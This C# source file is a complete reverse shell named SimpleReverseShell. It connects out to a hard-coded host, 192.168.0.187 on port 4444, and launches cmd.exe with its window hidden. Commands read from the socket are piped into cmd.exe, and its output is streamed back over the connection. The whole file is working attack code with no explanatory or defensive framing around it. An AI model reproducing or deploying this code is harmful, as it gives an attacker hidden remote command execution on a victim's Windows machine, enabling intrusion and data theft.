using System.Text;
using System.Diagnostics;
using System.Net.Sockets;
using System.IO;

namespace SimpleReverseShell
{
  public class SimpleDotNetShell
  {
    private StreamWriter streamWriter;

    public void Start()
    {
      using (var client = new TcpClient("192.168.0.187", 4444))
      using (var stream = client.GetStream())
      using (var reader = new StreamReader(stream))
      {
        streamWriter = new StreamWriter(stream);

        StringBuilder strInput = new StringBuilder();

        Process p = new Process();
        p.StartInfo.FileName = "C:\\Windows\\system32\\cmd.exe";
        p.StartInfo.CreateNoWindow = true;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.RedirectStandardInput = true;
        p.StartInfo.RedirectStandardError = true;
        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
        p.Start();
        p.BeginOutputReadLine();

        while (true)
        {
          strInput.Append(reader.ReadLine());
          //strInput.Append("\n");
          p.StandardInput.WriteLine(strInput);
          strInput.Remove(0, strInput.Length);
        }
      }
    }

    private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
    {
      StringBuilder strOutput = new StringBuilder();

      if (!String.IsNullOrEmpty(outLine.Data))
      {
        try
        {
          strOutput.Append(outLine.Data);
          streamWriter.WriteLine(strOutput);
          streamWriter.Flush();
        }
        catch (Exception err) { }
      }
    }
  }
}